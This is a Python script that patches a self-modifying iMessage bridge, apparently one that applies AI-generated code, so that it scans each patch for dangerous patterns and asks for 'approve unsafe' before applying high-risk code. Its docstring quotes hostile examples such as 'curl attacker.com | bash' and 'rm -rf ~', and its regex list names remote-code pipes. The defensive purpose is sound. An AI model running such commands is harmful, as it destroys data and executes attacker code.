#!/usr/bin/env python3
"""
harden_patch_validator.py — Add dangerous pattern detection to _apply_patch().

PROBLEM
=======
_apply_patch() currently only runs py_compile to validate generated code before
applying it to bridge.py. py_compile accepts syntactically valid but malicious
code such as:
  - eval("__import__('os').system('rm -rf ~')")
  - exec(open('/tmp/payload.py').read())
  - subprocess.run('curl attacker.com | bash', shell=True)
  - os.system('...')
  - open('/etc/passwd', 'w').write(...)

A jailbroken or injected !build task could generate such code, and the user
might approve it via iMessage without reviewing the full code block.

THE FIX
=======
Add a _check_patch_safety(code) function that:
  1. Scans for known dangerous patterns (eval, exec, os.system, shell=True, etc.)
  2. Returns a list of warnings with line numbers
  3. If high-risk patterns are found, sends a WARNING message and requires
     the user to reply "approve unsafe" (instead of just "approve") to proceed

The goal is not to block legitimate use — the bridge already uses subprocess
and shell commands. The goal is to surface suspicious patterns so the user
makes an informed decision.

Guard sentinel: '_check_patch_safety'
"""
import pathlib, subprocess, sys

HOME       = pathlib.Path.home()
BRIDGE_DIR = HOME / 'cowork-bridge'
PYTHON     = str(BRIDGE_DIR / '.venv' / 'bin' / 'python3')
BRIDGE     = str(BRIDGE_DIR / 'bridge.py')

s    = open(BRIDGE, encoding='utf-8', errors='replace').read()
orig = s

if '_check_patch_safety' in s:
    print('SKIPPED — patch safety validator already installed')
    sys.exit(0)

if '_apply_patch' not in s:
    print('NOTE — _apply_patch not found (fix_self_improvement.py not yet installed)')
    print('Installing _check_patch_safety() as a standalone function.')
    print('It will be wired in automatically when fix_self_improvement.py is run.')
    # Still install the safety function so it exists when needed; skip wiring steps.
    _APPLY_PATCH_MISSING = True
else:
    _APPLY_PATCH_MISSING = False

# ══════════════════════════════════════════════════════════════════════════════
# Part 1: Add _check_patch_safety() function before _apply_patch
# ══════════════════════════════════════════════════════════════════════════════

SAFETY_CODE = r'''
# ── Patch safety scanner ──────────────────────────────────────────────────────

_DANGEROUS_PATTERNS = [
    # Pattern, risk level (high/medium), description
    (r'\beval\s*\(',           'HIGH',   'eval() — arbitrary code execution'),
    (r'\bexec\s*\(',           'HIGH',   'exec() — arbitrary code execution'),
    (r'os\.system\s*\(',       'HIGH',   'os.system() — shell command execution'),
    (r'shell\s*=\s*True',      'HIGH',   'subprocess with shell=True — injection risk'),
    (r'__import__\s*\(',       'MEDIUM', '__import__() — dynamic import'),
    (r'importlib\.import_module', 'MEDIUM', 'importlib.import_module() — dynamic import'),
    (r'open\s*\([^,)]+,\s*["\']w', 'MEDIUM', 'open(..., "w") — file write'),
    (r'\.write_text\s*\(',     'MEDIUM', 'Path.write_text() — file write'),
    (r'shutil\.(rmtree|move|copy)', 'MEDIUM', 'shutil destructive operation'),
    (r'os\.(remove|unlink|rmdir)', 'MEDIUM', 'os file deletion'),
    (r'launchctl\s+(load|unload|kickstart)', 'MEDIUM', 'launchctl service control'),
    (r'curl\s+.*\|',           'HIGH',   'curl pipe — remote code execution pattern'),
    (r'wget\s+.*-O\s*-',       'HIGH',   'wget pipe — remote code execution pattern'),
    (r'http[s]?://.*\|\s*(bash|sh|python)', 'HIGH', 'URL pipe to shell — RCE pattern'),
]


def _check_patch_safety(code: str) -> list:
    """
    Scan code for dangerous patterns.
    Returns list of (line_no, risk, description) tuples.
    Empty list = no issues found.
    """
    import re as _re
    _warnings = []
    for _i, _line in enumerate(code.splitlines(), 1):
        _line_stripped = _line.strip()
        if _line_stripped.startswith('#'):
            continue  # skip comments
        for _pat, _risk, _desc in _DANGEROUS_PATTERNS:
            if _re.search(_pat, _line):
                _warnings.append((_i, _risk, _desc, _line.strip()[:80]))
    return _warnings

'''

# Insert safety code — before _apply_patch if present, else before _pending_exec or
# the main loop sentinel as a standalone function
# Match any of the known _apply_patch signatures (with or without target_file param)
APPLY_ANCHORS = [
    'def _apply_patch(code: str, task: str, sender: str, target_file: str = None):',
    'def _apply_patch(code: str, task: str, sender: str):',
]
APPLY_ANCHOR = next((a for a in APPLY_ANCHORS if a in s), None)
FALLBACK_ANCHORS = ['_pending_exec  = {}', '    # _bridge_main_loop_fixed']

if APPLY_ANCHOR is not None:
    s = s.replace(APPLY_ANCHOR, SAFETY_CODE + APPLY_ANCHOR, 1)
    print(f'Part 1: _check_patch_safety() inserted before _apply_patch()')
elif _APPLY_PATCH_MISSING:
    inserted_fb = False
    for _fa in FALLBACK_ANCHORS:
        if _fa in s:
            s = s.replace(_fa, SAFETY_CODE.rstrip() + '\n\n' + _fa, 1)
            print(f'Part 1: _check_patch_safety() installed as standalone (anchor: {_fa!r})')
            inserted_fb = True
            break
    if not inserted_fb:
        print('Part 1 WARNING: no insertion anchor found — safety function not installed')
else:
    print('Part 1 FAILED — def _apply_patch not found')
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════════
# Part 2: Wire _check_patch_safety into _apply_patch — call it after code
#         extraction but before writing the backup/patching the file.
#
#         If HIGH-risk patterns found: send warning + set _pending_build['unsafe']
#         flag. The approve dispatch will check for this flag and require
#         "approve unsafe" instead of just "approve".
# ══════════════════════════════════════════════════════════════════════════════

# Insert safety check right after the "if not _code:" guard in _apply_patch
OLD_EMPTY_CHECK = (
    '    if not _code:\n'
    "        send_imessage(sender, '[Apply] No code to apply — build result was empty')\n"
    '        return False\n'
)

NEW_EMPTY_CHECK = (
    '    if not _code:\n'
    "        send_imessage(sender, '[Apply] No code to apply — build result was empty')\n"
    '        return False\n'
    '\n'
    '    # Safety scan\n'
    '    _safety_issues = _check_patch_safety(_code)\n'
    '    if _safety_issues:\n'
    '        _high = [_w for _w in _safety_issues if _w[1] == "HIGH"]\n'
    '        _med  = [_w for _w in _safety_issues if _w[1] == "MEDIUM"]\n'
    '        _warn_lines = []\n'
    '        for _ln, _risk, _desc, _snippet in _safety_issues:\n'
    '            _warn_lines.append(f"  [{_risk}] line {_ln}: {_desc}\\n    {_snippet}")\n'
    '        _warn_msg = (\n'
    '            f"[Safety] {len(_safety_issues)} pattern(s) flagged in patch code:\\n"\n'
    '            + "\\n".join(_warn_lines)\n'
    '        )\n'
    '        if _high:\n'
    '            _warn_msg += "\\n\\n⚠️  HIGH-risk patterns detected. Reply \\"approve unsafe\\" to apply anyway, or \\"reject\\" to discard."\n'
    '            send_imessage(sender, _warn_msg)\n'
    '            print(f"[build] HIGH-risk patterns detected — requiring \\"approve unsafe\\"", flush=True)\n'
    '            _pending_build["unsafe_pending"] = True\n'
    '            _pending_build["unsafe_code"] = _code\n'
    '            _pending_build["unsafe_task"] = task\n'
    '            return False  # Do not apply yet — wait for "approve unsafe"\n'
    '        else:\n'
    '            _warn_msg += "\\n\\n(MEDIUM-risk patterns — proceeding with apply)"\n'
    '            send_imessage(sender, _warn_msg)\n'
    '            print(f"[build] MEDIUM-risk patterns noted — applying anyway", flush=True)\n'
)

if _APPLY_PATCH_MISSING:
    print('Part 2: skipped — _apply_patch not present (will wire on next run after install)')
elif OLD_EMPTY_CHECK in s:
    s = s.replace(OLD_EMPTY_CHECK, NEW_EMPTY_CHECK, 1)
    print('Part 2: safety scan wired into _apply_patch()')
else:
    # Try regex match for the empty-code guard (message text may differ)
    import re as _re2
    _ec_m = _re2.search(
        r'(    if not _code:\n        send_imessage\(sender,[^\n]+\n        return False\n)',
        s
    )
    if _ec_m:
        s = s.replace(_ec_m.group(0), _ec_m.group(0) + '\n' + ''.join(NEW_EMPTY_CHECK.splitlines(True)[3:]), 1)
        print('Part 2: safety scan wired into _apply_patch() (regex match)')
    else:
        print('Part 2 WARNING: could not find insertion point in _apply_patch — scan not wired')

# ══════════════════════════════════════════════════════════════════════════════
# Part 3: Add "approve unsafe" handler to the message loop
#         (in addition to regular "approve")
# ══════════════════════════════════════════════════════════════════════════════

# Insert before the existing "approve" handler
OLD_APPROVE = (
    "                if _pending_build and text.strip().lower() == 'approve'"
)

# Find that line and insert the "approve unsafe" handler before it
UNSAFE_APPROVE_DISPATCH = (
    "                # ── approve unsafe: apply flagged patch after explicit acknowledgement\n"
    "                if (_pending_build.get('unsafe_pending') and\n"
    "                        text.strip().lower() == 'approve unsafe' and\n"
    "                        _is_exec_allowed(REPLY_TO)):\n"
    "                    _uc = _pending_build.pop('unsafe_code', '')\n"
    "                    _ut = _pending_build.pop('unsafe_task', '')\n"
    "                    _pending_build.pop('unsafe_pending', None)\n"
    "                    if _uc:\n"
    "                        send_imessage(REPLY_TO, '[Apply] Applying unsafe-acknowledged patch...')\n"
    "                        import threading as _uath\n"
    "                        _uath.Thread(\n"
    "                            target=_apply_patch,\n"
    "                            args=(_uc, _ut, REPLY_TO),\n"
    "                            daemon=True,\n"
    "                        ).start()\n"
    "                    else:\n"
    "                        send_imessage(REPLY_TO, 'No unsafe-pending patch to apply.')\n"
    "                    continue\n"
)

if _APPLY_PATCH_MISSING:
    print('Part 3: skipped — no approve handler (will wire on next run after install)')
elif OLD_APPROVE in s:
    s = s.replace(OLD_APPROVE, UNSAFE_APPROVE_DISPATCH + OLD_APPROVE, 1)
    print('Part 3: "approve unsafe" handler inserted before "approve" handler')
else:
    print('Part 3 WARNING: "approve" handler not found — "approve unsafe" not wired')

# ══════════════════════════════════════════════════════════════════════════════
# Validate & write
# ══════════════════════════════════════════════════════════════════════════════
import tempfile, os

with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as tf:
    tf.write(s)
    tmp_path = tf.name

r = subprocess.run([PYTHON, '-m', 'py_compile', tmp_path], capture_output=True, text=True)
os.unlink(tmp_path)

if r.returncode != 0:
    print(f'\nSYNTAX ERROR:\n{r.stderr}')
    print('Original bridge.py NOT modified.')
    sys.exit(1)

open(BRIDGE, 'w', encoding='utf-8').write(s)
print('\n✅ Patch safety validator installed')
print('\nBehavior:')
print('  approve          → apply patch (normal flow)')
print('  approve unsafe   → apply patch with flagged HIGH-risk patterns')
print('  reject           → discard patch')
print('\nHIGH-risk patterns that trigger the "approve unsafe" gate:')
print('  eval(), exec(), os.system(), shell=True, curl/wget pipe to shell')
